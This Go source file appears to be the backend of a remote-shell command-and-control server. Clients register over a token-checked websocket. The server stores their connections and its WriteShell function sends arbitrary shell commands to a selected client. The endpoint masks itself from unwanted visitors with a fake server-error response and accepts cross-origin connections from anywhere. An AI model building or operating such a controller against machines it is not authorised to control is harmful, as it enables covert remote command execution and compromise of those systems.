package backend

import (
	"civetcat/pb"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/golang/protobuf/proto"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"sync"
)

var (
	upgrader = websocket.Upgrader{
		// 允许跨域
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}
)

type Server struct {
	addr  string
	token string

	Local string

	Mu       sync.Mutex
	Db       map[string]*websocket.Conn
	RespChan chan *pb.Resp_GeneralResp
}

func NewServer(addr, token string) *Server {
	rsp := &Server{
		addr:     addr,
		token:    token,
		RespChan: make(chan *pb.Resp_GeneralResp, 100),
		Db:       map[string]*websocket.Conn{},
	}
	rsp.init()
	return rsp
}

func (s *Server) init() {
	gin.SetMode(gin.ReleaseMode)
	app := gin.New()
	app.Use(gin.Recovery())

	app.GET("registration", s.tokenCheck, s.registry)

	go func() {
		err := app.Run(s.addr)
		if err != nil {
			log.Fatalln(err)
		}
	}()
}

func (s *Server) tokenCheck(ctx *gin.Context) {
	token := ctx.Request.Header.Get("Sec-Websocket-Protocol")
	if token != s.token {
		ctx.JSON(500, "500 server Error") // Fraudulent crawler
		fmt.Printf("Token Err: %s Addr: %s \n", token, ctx.ClientIP())
		ctx.Abort()
		return
	}
	ctx.Next()
}

func (s *Server) registry(ctx *gin.Context) {
	conn, err := upgrader.Upgrade(ctx.Writer, ctx.Request, nil)
	if err != nil {
		log.Println(err)
		return
	}
	s.Mu.Lock()
	s.Db[conn.RemoteAddr().String()] = conn
	s.Mu.Unlock()

	go s.listen(conn)
	log.Println("Reg Success: ", conn.RemoteAddr().String())
}

func (s *Server) WriteShell(cmd string) error {
	if s.Local == "" {
		return errors.New("local is null")
	}
	s.Mu.Lock()
	conn, bo := s.Db[s.Local]
	s.Mu.Unlock()
	if !bo {
		return errors.New("local not exits")
	}
	result := &pb.Resp{
		RespItem: &pb.Resp_Shell{
			Shell: &pb.DeShell{Cmd: cmd},
		},
	}
	marshal, err := proto.Marshal(result)
	if err != nil {
		return err
	}
	return conn.WriteMessage(websocket.TextMessage, marshal)
}

func (s *Server) listen(conn *websocket.Conn) {
	key := conn.RemoteAddr().String()
	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			conn.Close()
			delete(s.Db, key)
			break
		}
		resp := &pb.Resp{}
		err = proto.Unmarshal(data, resp)
		if err != nil {
			log.Println(err)
			continue
		}
		switch ac := resp.RespItem.(type) {
		case *pb.Resp_Heartbeat:
			continue
		case *pb.Resp_GeneralResp:
			if key == s.Local {
				s.RespChan <- ac
			}
			continue
		}
	}
}
